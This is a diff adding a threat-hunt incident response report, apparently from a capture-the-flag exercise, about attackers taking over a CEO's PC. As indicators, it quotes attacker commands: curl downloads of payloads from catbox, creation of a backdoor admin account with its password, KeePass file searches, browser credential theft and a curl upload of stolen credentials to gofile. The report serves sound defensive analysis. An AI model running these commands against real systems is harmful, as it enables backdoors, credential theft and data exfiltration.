@@ -1,0 +1,181 @@
+# DEC20Threathunt
+
+Incident Response report from Threat Hunt
+
+<img width="525" height="795" alt="Screenshot 2025-12-24 at 2 43 46 PM" src="https://github.com/user-attachments/assets/786e43c2-f9c2-4e8f-a916-560ca4e42801" />
+
+📝 INCIDENT RESPONSE REPORT
+
+Date of Report: 2025-12-20 
+Severity Level: HIGH  
+Report Status: Open  
+Escalated To: Incident Response Team  
+Incident ID: AZUKI-2025-DEC-BRIDGE-TAKEOVER
+Analyst: Brian Sanford
+
+---
+
+## 📌 SUMMARY OF FINDINGS
+
+- Five days after the November 19th file server breach, threat actors re-entered the environment with elevated sophistication, pivoting from a compromised workstation to the CEO’s administrative PC (**azuki-adminpc**).
+- Lateral movement originated from internal source **10.1.0.204**, indicating prior credential theft and internal reconnaissance.
+- The attacker leveraged compromised credentials belonging to **yuki.tanaka**, distinct from the original November breach account.
+- A malicious payload was downloaded from external file hosting service **litter.catbox.moe** using **curl.exe**, masquerading as a Windows update archive.
+- The payload was extracted using **7-Zip with a password-protected archive**, indicating deliberate evasion of static inspection.
+- A **Meterpreter implant (meterpreter.exe)** was deployed, providing full interactive C2 control.
+- **Named pipe–based persistence** (`\Device\NamedPipe\msf-pipe-5722`) was established, confirming Metasploit framework usage.
+- The attacker executed **Base64-encoded PowerShell commands** to create a backdoor administrator account (**yuki.tanaka2**) and escalate privileges.
+- Extensive **domain, session, and network discovery** was conducted using native Windows utilities (`qwinsta.exe`, `nltest.exe`, `netstat.exe`).
+- The threat actor searched for and harvested **password databases (KeePass)** and plaintext credential files.
+- **Automated data collection** was performed using `robocopy.exe` to stage financial and credential data.
+- Sensitive data was compressed into multiple archives and **exfiltrated to gofile.io**, a legitimate cloud storage service.
+- The operation culminated in **browser credential theft**, extraction of **KeePass master passwords**, and confirmed financial data exfiltration.
+
+---
+
+## 👤 WHO
+
+### Attacker Source & Infrastructure
+- **Lateral Movement Source IP:** `10.1.0.204`  
+- **Payload Hosting Service:** `litter.catbox.moe`  
+- **Exfiltration Domain:** `gofile.io`  
+- **Exfiltration IP:** `45.112.123.227`  
+
+### Compromised Accounts
+- `yuki.tanaka`  
+- **Backdoor Account:** `yuki.tanaka2`  
+
+### Compromised Systems
+- **azuki-adminpc** (CEO Administrative PC)
+
+---
+
+## 📂 WHAT (Event Summary)
+
+### 🚩 Flags & Indicators of Compromise (IOCs)
+
+| Flag # | IOC Category | Flag Answer | Timestamp |
+|------:|-------------|-------------|-----------|
+| 1 | Lateral movement source IP | 10.1.0.204 | 2025-11-24 |
+| 2 | Compromised account | yuki.tanaka | 2025-11-24 |
+| 3 | Lateral movement target | azuki-adminpc | 2025-11-24 |
+| 4 | Payload hosting service | litter.catbox.moe | 2025-11-25 |
+| 5 | Malware download command | `curl.exe -L -o KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z` | 2025-11-25 |
+| 6 | Archive extraction command | `7z.exe x KB5044273-x64.7z -p********` | 2025-11-25 |
+| 7 | C2 implant | meterpreter.exe | 2025-11-25 |
+| 8 | Named pipe persistence | `\Device\NamedPipe\msf-pipe-5722` | 2025-11-25 |
+| 9 | Backdoor account creation | `net user yuki.tanaka2 B@ckd00r2024! /add` | 2025-11-25 |
+| 10 | Backdoor username | yuki.tanaka2 | 2025-11-25 |
+| 11 | Privilege escalation | `net localgroup Administrators yuki.tanaka2 /add` | 2025-11-25 |
+| 12 | Session enumeration | qwinsta.exe | 2025-11-25 |
+| 13 | Domain trust discovery | `nltest.exe /domain_trusts /all_trusts` | 2025-11-25 |
+| 14 | Network enumeration | `netstat.exe -ano` | 2025-11-25 |
+| 15 | Password DB search | `where /r C:\Users *.kdbx` | 2025-11-25 |
+| 16 | Credential file | OLD-Passwords.txt | 2025-11-25 |
+| 17 | Staging directory | `C:\ProgramData\Microsoft\Crypto\staging` | 2025-11-25 |
+| 18 | Automated collection | `robocopy.exe …\Banking` | 2025-11-25 |
+| 19 | Exfil archives | 8 unique archives | 2025-11-25 |
+| 20 | Cred theft tool download | `curl.exe -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z` | 2025-11-25 |
+| 21 | Browser credential theft | dpapi::chrome | 2025-11-25 |
+| 22 | Exfil upload command | `curl.exe -X POST -F file=@credentials.tar.gz` | 2025-11-25 |
+| 23 | Cloud exfil service | gofile.io | 2025-11-25 |
+| 24 | Exfil destination IP | 45.112.123.227 | 2025-11-25 |
+| 25 | Master password file | KeePass-Master-Password.txt | 2025-11-25 |
+
+---
+
+## ⏱ WHEN (UTC Timeline)
+
+- **11-24** – Lateral movement detected from `10.1.0.204`  
+- **11-25** – Payload download from `litter.catbox.moe`  
+- **11-25** – Archive extraction & Meterpreter deployment  
+- **11-25** – Backdoor admin account created  
+- **11-25** – Credential discovery & data staging  
+- **11-25** – Exfiltration to `gofile.io`  
+
+---
+
+## 🖥 WHERE (Infrastructure Impact)
+
+### Compromised Host
+- azuki-adminpc
+
+### Attacker Infrastructure
+- `litter.catbox.moe` (Payload hosting)  
+- `gofile.io` (Data exfiltration)  
+- `45.112.123.227` (Exfil destination)
+
+### Malware & Staging Locations
+- `C:\Windows\Temp\cache`  
+- `C:\ProgramData\Microsoft\Crypto\staging`
+
+---
+
+## ❓ WHY (Attacker Motivation & Root Cause)
+
+### Root Cause
+- Stolen credentials from the November breach enabled internal lateral movement without detection.
+- Lack of privileged account segmentation allowed direct access to executive systems.
+
+### Attacker Objectives
+- Establish persistent access to executive infrastructure.
+- Harvest credentials and password databases.
+- Steal financial and authentication data.
+- Maintain covert long-term access using backdoor accounts and Meterpreter C2.
+
+### Business Impact
+- Exposure of financial records and credential vaults.
+- Full compromise of CEO administrative environment.
+- Severe reputational and regulatory risk.
+
+---
+
+## ⚙️ HOW (Full Attack Chain)
+
+- Internal pivot via compromised credentials (`yuki.tanaka`)
+- Payload download via `curl.exe`
+- Password-protected archive extraction
+- Meterpreter implant execution
+- Named pipe persistence
+- Base64 PowerShell backdoor creation
+- Privilege escalation
+- Domain, session, and network discovery
+- Credential harvesting (KeePass, browser DPAPI)
+- Automated data staging with Robocopy
+- Multi-archive exfiltration to cloud storage
+
+---
+
+## 🚨 IMPACT ASSESSMENT
+
+### Actual Impact
+- Executive system compromise
+- Credential vault exposure
+- Financial data theft
+- Persistent backdoor access
+
+### Risk Level
+**CRITICAL**
+
+---
+
+## 🛠 RECOMMENDATIONS
+
+### 🔥 IMMEDIATE
+- Disable `yuki.tanaka` and `yuki.tanaka2`
+- Isolate `azuki-adminpc`
+- Block `litter.catbox.moe` and `gofile.io`
+- Reset all executive and privileged credentials
+
+### ⏳ SHORT-TERM
+- Rebuild compromised systems
+- Audit all admin accounts
+- Rotate KeePass master passwords
+- Review lateral movement paths
+
+### 🛡 LONG-TERM
+- Enforce MFA everywhere
+- Harden executive endpoints
+- Monitor cloud storage exfiltration
+- Detect encoded PowerShell
+- Implement named pipe telemetry
